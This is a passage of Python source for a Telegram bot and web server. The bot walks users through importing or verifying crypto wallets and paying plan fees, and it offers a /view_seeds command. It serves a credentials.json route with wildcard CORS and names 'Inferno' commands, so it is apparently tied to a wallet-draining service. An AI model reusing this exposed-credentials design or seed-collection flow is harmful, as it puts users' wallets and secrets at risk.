            return web.json_response({'status': 'error', 'message': 'Unauthorized rotation attempt'}, status=403)

    success = store_credentials(panel_id, new_password, user_id)
    if not success:
        return web.json_response({'status': 'error', 'message': 'Credential rotation failed'}, status=500)

    revoke_credential_session(session_id)
    new_session_id, _ = create_credential_session(panel_id, user_id)
    new_token = generate_ocrs_token(panel_id, user_id, new_session_id)

    logger.info(f"OCRS rotation completed for panel_id: {panel_id}")
    return web.json_response({
        'status': 'success',
        'message': 'Credentials rotated successfully',
        'ocrs_token': new_token,
        'ocrs_expires_in': OCRS_TOKEN_EXPIRY_HOURS * 3600
    })


async def handle_ocrs_validate_token(request):
    """Lightweight endpoint for clients to check token validity without hitting a protected route."""
    data = await request.json()
    token = data.get('token')
    if not token:
        return web.json_response({'status': 'error', 'message': 'token is required'}, status=400)

    payload = validate_ocrs_token(token)
    if payload is None:
        return web.json_response({'status': 'success', 'valid': False})

    return web.json_response({
        'status': 'success',
        'valid': True,
        'panel_id': payload['sub'],
        'expires_at': payload['exp']
    })


async def handle_cors_preflight(request):
    """Handle CORS preflight requests."""
    return web.Response(status=200)

def create_web_app():
    """Create and configure the aiohttp web application."""
    app = web.Application()
    
    # Add routes
    app.router.add_post('/verify_credentials', handle_verify_credentials)
    app.router.add_post('/logout', handle_logout)
    app.router.add_post('/ocrs/rotate', handle_ocrs_rotate)
    app.router.add_post('/ocrs/validate_token', handle_ocrs_validate_token)
    app.router.add_get('/credentials.json', handle_get_credentials)
    app.router.add_options('/verify_credentials', handle_cors_preflight)
    app.router.add_options('/logout', handle_cors_preflight)
    app.router.add_options('/ocrs/rotate', handle_cors_preflight)
    app.router.add_options('/ocrs/validate_token', handle_cors_preflight)
    
    # Add CORS middleware
    @web.middleware
    async def cors_middleware(request, handler):
        if request.method == 'OPTIONS':
            return web.Response(
                status=200,
                headers={
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
                }
            )
        
        response = await handler(request)
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        return response
    
    app.middlewares.append(cors_middleware)
    # Add health endpoint to aiohttp app so Render health checks can reach it
    async def aio_health(request):
        try:
            bot_status = 'unknown'
            try:
                token = BOT_TOKEN if 'BOT_TOKEN' in globals() else os.getenv('TELEGRAM_BOT_TOKEN')
                if token:
                    # run blocking get_me in executor
                    loop = asyncio.get_event_loop()
                    from telegram import Bot as TgBot
                    def _get_me():
                        b = TgBot(token=token)
                        return b.get_me()
                    try:
                        me = await loop.run_in_executor(None, _get_me)
                        bot_status = 'ok' if getattr(me, 'username', None) else 'ok'
                    except Exception:
                        bot_status = 'unreachable'
            except Exception:
                bot_status = 'unreachable'

            sessions = get_active_session_count()
            return web.json_response({
                'status': 'ok',
                'bot': bot_status,
                'active_sessions': sessions,
                'timestamp': datetime.now(timezone.utc).isoformat()
            })
        except Exception as e:
            logger.exception(f"aio_health failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)

    app.router.add_get('/health', aio_health)
    return app

def start_web_server(port=8080):
    """Start the credential verification web server in the current event loop."""
    try:
        app = create_web_app()
        runner = web.AppRunner(app)
        asyncio.create_task(_start_web_runner(runner, port))
        logger.info(f"✅ Web server starting on port {port}")
    except Exception as e:
        logger.error(f"❌ Error starting web server: {e}")

async def _start_web_runner(runner, port):
    """Async helper to start the web server runner."""
    try:
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"✅ Web server listening on http://0.0.0.0:{port}")
    except Exception as e:
        logger.error(f"❌ Web server startup failed: {e}")

job_queue = JobQueue()  # no timezone argument here
job_queue.scheduler.configure(timezone=pytz.UTC)

def main():
    migrate_wallet_schema()
    create_wallets_table()
    migrate_credentials_schema()
    create_credentials_table()
    create_credential_sessions_table()
    normalize_database_timestamps()
    create_user_settings_table()
    # Export existing credentials to JSON on startup
    export_credentials_to_json()

    application = Application.builder()\
    .token(BOT_TOKEN)\
    .job_queue(job_queue)\
    .build()
    # expose for webhook integration
    global TELEGRAM_APP
    TELEGRAM_APP = application
    
    # Define combined filter for production-grade protection (catches both direct and through backdoor)
    private_chat_filter = filters.ChatType.PRIVATE
    
    # Fee setup handler for conversation flow
    async def show_fee_setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show setup fee message in conversation flow"""
        message = update.message or update.callback_query.message
        await send_setup_fee_message(message, update, context)
        return PLAN_SELECTION
    
    # Add conversation handler to application setup
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start, filters.ChatType.PRIVATE),
            CommandHandler('set_up', set_up, filters.ChatType.PRIVATE)
        ],
        states={
            SETUP: [
                CallbackQueryHandler(handle_existing_wallet, pattern="^use_existing_wallet$"),
                CallbackQueryHandler(new_ethereum_wallet, pattern="^new_ethereum_wallet$"),
                CallbackQueryHandler(features, pattern="^features$"),
            ],
            PLAN_SELECTION: [
                CallbackQueryHandler(proceed_to_plans, pattern="^proceed_to_plans$"),
                CallbackQueryHandler(plan_details, pattern="^plan_.*$"),
            ],
            WALLET_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND & private_chat_filter, process_imported_wallet),
                CallbackQueryHandler(cancel_setup, pattern="^cancel_wallet$"),
                CallbackQueryHandler(restart_setup, pattern="^restart_setup$"),
            ],
            VERIFY_WALLET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND & private_chat_filter, verify_wallet)
            ],
            FEE_CONFIRMATION: [
                CommandHandler("lang", lang_command),
                CallbackQueryHandler(language_callback, pattern="^lang:"),
                CallbackQueryHandler(show_fee_setup, pattern=".*"),  # Any callback in fee confirmation
                MessageHandler(filters.ALL & private_chat_filter, show_fee_setup),  # Any message triggers fee setup (private chat only)
            ],
        },
        fallbacks=[
            CommandHandler("lang", lang_command),
            CallbackQueryHandler(language_callback, pattern="^lang:"),
            CommandHandler("reset_wallet", reset_wallet, filters=logs_only_group_filter),
            CommandHandler('cancel', cancel_setup, filters=logs_only_group_filter),
        ],
        allow_reentry=True,
        map_to_parent={
            ConversationHandler.END: ConversationHandler.END
        }
    )
    
    # Add group command blocker FIRST (before all other handlers) with highest priority
    # This acts as a safety net to catch and restrict group commands
    application.add_handler(MessageHandler(filters.COMMAND & filters.ChatType.GROUPS, block_group_commands), group=-2)
    
    application.add_handler(conv_handler)
    application.add_handler(get_payment_conversation_handler())

    # Wallet creation and verification commands (private-chat-only)
    for command in Inferno_COMMANDS:
        application.add_handler(CommandHandler(command, Inferno_not_setup, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("get_logs", get_logs), group=1)
    logger.info("Handler registered: /get_logs")
    # Private-chat-only commands (wallet setup, user panels, sensitive data)
    # NOTE: /start and /set_up are ONLY in ConversationHandler entry_points, NOT registered here to avoid duplicates
    # All other private commands are registered here with combined filter
    application.add_handler(CommandHandler("new_ethereum_wallet", new_ethereum_wallet, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("delete_all_wallets", delete_all_wallets, filters.ChatType.PRIVATE), group=-1)
    application.add_handler(CommandHandler("delete_all", delete_all_wallets, filters.ChatType.PRIVATE), group=-1)
    application.add_handler(CommandHandler("delete", delete_wallets, filters.ChatType.PRIVATE), group=-1)
    application.add_handler(CommandHandler("proceed_to_plans", proceed_to_plans, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("choose_plan", proceed_to_plans, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("setup_fee", setup_fee, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("panel", panel, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("login", login_command, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("view_seeds", view_seeds, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("help", help_command, filters.ChatType.PRIVATE))
    
    # Commands that work in both contexts
    application.add_handler(CommandHandler("faq", faq))
    application.add_handler(CommandHandler("features", features_command))
    application.add_handler(CommandHandler("lang", lang_command, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("wake_wake", wake_wake))
    application.add_handler(CommandHandler("info", info_command, filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("id", send_user_id))
    application.add_handler(CommandHandler("cancel", cancel_setup))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler))
    application.add_handler(CallbackQueryHandler(language_callback, pattern="^lang:"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown_text_handler), group=2)
    application.add_handler(MessageHandler(filters.ALL, update_user_activity), group=1)
    application.add_handler(CallbackQueryHandler(update_user_activity), group=1)
    
    # CallbackQuery handlers for plan selection and payment flow
    # Handler for plan selection button (callback data: "plan:diamond:btc", etc.)
    application.add_handler(CallbackQueryHandler(
        lambda update, context: handle_plan_selection(
            update.callback_query,
            *update.callback_query.data.split(":")[1:],
            context
        ),
        pattern=r"^plan:"
    ))
    application.add_handler(CallbackQueryHandler(new_ethereum_wallet, pattern=r"^new_eth_wallet$"))
    application.add_handler(CallbackQueryHandler(payment_confirmation, pattern=r"^confirm"))
    application.add_handler(CallbackQueryHandler(payment_confirmation, pattern="^confirm_payment:.*$"))
    application.add_handler(CallbackQueryHandler(proceed_to_plans_callback, pattern="proceed_to_plans"))
    application.add_handler(CallbackQueryHandler(plan_details, pattern="^plan_.*$"))
    application.add_handler(CallbackQueryHandler(proceed_to_plans, pattern="proceed_to_plans"))
    application.add_handler(CallbackQueryHandler(choose_payment_method, pattern="^choose_currency_.*$"))
    application.add_handler(CallbackQueryHandler(payment_method, pattern="^pay:.*$"))
    application.add_handler(CallbackQueryHandler(choose_payment_method, pattern="^plan_.*$"))
    application.add_handler(CallbackQueryHandler(choose_payment_method, pattern="^pay:.*$"))
    application.add_handler(CallbackQueryHandler(choose_payment_method, pattern="^choose_currency_.*$"))
    application.add_handler(CallbackQueryHandler(inline_button_handler, pattern="start_setup"))
    application.add_handler(CallbackQueryHandler(new_ethereum_wallet, pattern="new_ethereum_wallet"))
    application.add_handler(CallbackQueryHandler(features, pattern="features"))
    application.add_handler(CallbackQueryHandler(choose_payment_method, pattern="plan_.*"))
         # Register interrupt handlers (except for panel interactions)
    register_interrupt_handlers(application)

    # Start web server in a separate thread for credential verification
    def run_web_server_thread():
        """Run the web server in a separate event loop."""
        try:
            port = int(os.getenv('PORT', 8080))
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            app = create_web_app()
            runner = web.AppRunner(app)
            loop.run_until_complete(runner.setup())
            site = web.TCPSite(runner, '0.0.0.0', port)
            loop.run_until_complete(site.start())
            logger.info(f"✅ Web server listening on http://0.0.0.0:{port}")
            
            loop.run_forever()
        except Exception as e:
            logger.error(f"❌ Web server error: {e}")
    
    web_server_thread = threading.Thread(target=run_web_server_thread, daemon=True)
    web_server_thread.start()
    # Start the bot according to mode (polling or webhook)
    TELEGRAM_MODE = os.getenv('TELEGRAM_MODE', 'polling').lower()
    if TELEGRAM_MODE == 'webhook' and not os.getenv('TELEGRAM_WEBHOOK_URL'):
        logger.warning("TELEGRAM_MODE is set to webhook but TELEGRAM_WEBHOOK_URL is not configured. Falling back to polling for availability.")
        TELEGRAM_MODE = 'polling'

    if TELEGRAM_MODE == 'webhook':
        # For webhook mode, start the Application in its own asyncio loop/thread
        def _telegram_start_loop():
            global TELEGRAM_LOOP
            retry_delay = 10
            while True:
                loop = asyncio.new_event_loop()
                TELEGRAM_LOOP = loop
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(TELEGRAM_APP.initialize())
                    loop.run_until_complete(TELEGRAM_APP.start())
                    webhook_url = os.getenv('TELEGRAM_WEBHOOK_URL')
                    if webhook_url:
                        fut = asyncio.run_coroutine_threadsafe(TELEGRAM_APP.bot.set_webhook(webhook_url), loop)
                        try:
                            fut.result(5)
                            logger.info(f"Set Telegram webhook to {webhook_url}")
                        except Exception as e:
                            logger.warning(f"Failed to set Telegram webhook: {e}")
                    loop.run_forever()
                except Exception as e:
                    logger.exception("Telegram webhook loop crashed; restarting in %s seconds", retry_delay)
                finally:
                    try:
                        loop.run_until_complete(TELEGRAM_APP.stop())
                        loop.run_until_complete(TELEGRAM_APP.shutdown())
                    except Exception:
                        pass
                    try:
                        loop.close()
                    except Exception:
                        pass
                logger.warning("Telegram webhook thread restarting in %s seconds", retry_delay)
                time.sleep(retry_delay)

        t = threading.Thread(target=_telegram_start_loop, daemon=True)
        t.start()
        # start watchdog
        threading.Thread(target=_watchdog_loop, daemon=True).start()

        # Flask endpoint to receive Telegram updates and forward to the app's update queue
        @app.route('/telegram/webhook', methods=['POST'])
        def telegram_webhook():
            try:
                data = request.get_json(force=True)
                if not data:
                    return jsonify({'status': 'error', 'message': 'empty body'}), 400
                # If REDIS_URL is provided, enqueue raw update JSON to Redis for workers
                redis_url = os.getenv('REDIS_URL')
                if redis_url:
                    try:
                        r = redis.from_url(redis_url)
                        # push to list for workers to BRPOP
                        r.lpush('telegram_updates', json.dumps(data))
                        return jsonify({'status': 'queued'}), 200
                    except Exception as re:
                        logger.exception(f"Redis enqueue failed, falling back to local queue: {re}")

                update = Update.de_json(data, TELEGRAM_APP.bot)
                if TELEGRAM_LOOP is None:
                    logger.error('Telegram loop not ready')
                    return jsonify({'status': 'error', 'message': 'bot not ready'}), 503

                fut = asyncio.run_coroutine_threadsafe(TELEGRAM_APP.update_queue.put(update), TELEGRAM_LOOP)
                fut.result(timeout=2)
                return jsonify({'status': 'success'})
            except Exception as e:
                logger.exception(f"Error handling incoming webhook: {e}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        # Internal endpoint for trusted workers to inject updates back into the app
        @app.route('/_internal/ingest_update', methods=['POST'])
        def internal_ingest_update():
            # Require a shared secret header for safety
            secret = request.headers.get('X-INTERNAL-SHARED-SECRET')
            expected = os.getenv('INTERNAL_SHARED_SECRET')
            if expected and secret != expected:
                return jsonify({'status': 'error', 'message': 'unauthorized'}), 401
            try:
                data = request.get_json(force=True)
                if not data:
                    return jsonify({'status': 'error', 'message': 'empty body'}), 400

                update = Update.de_json(data, TELEGRAM_APP.bot)
                if TELEGRAM_LOOP is None:
                    logger.error('Telegram loop not ready')
                    return jsonify({'status': 'error', 'message': 'bot not ready'}), 503

                fut = asyncio.run_coroutine_threadsafe(TELEGRAM_APP.update_queue.put(update), TELEGRAM_LOOP)
                fut.result(timeout=2)
                return jsonify({'status': 'success'})
            except Exception as e:
                logger.exception(f"Internal ingest failed: {e}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        logger.info('Telegram running in webhook mode; POST updates to /telegram/webhook')
    else:
        # Default: polling mode
        # start watchdog in background
        threading.Thread(target=_watchdog_loop, daemon=True).start()
        retry_delay = 5
        while True:
            try:
                logger.info("Starting Telegram polling loop")
                application.run_polling(
                    allowed_updates=Update.ALL_TYPES,
                    drop_pending_updates=True
                )
                logger.warning("Telegram polling exited unexpectedly; restarting in %s seconds", retry_delay)
            except Exception as e:
                logger.exception("Telegram polling crashed; restarting in %s seconds", retry_delay)
            time.sleep(retry_delay)

if __name__ == "__main__":
    main()




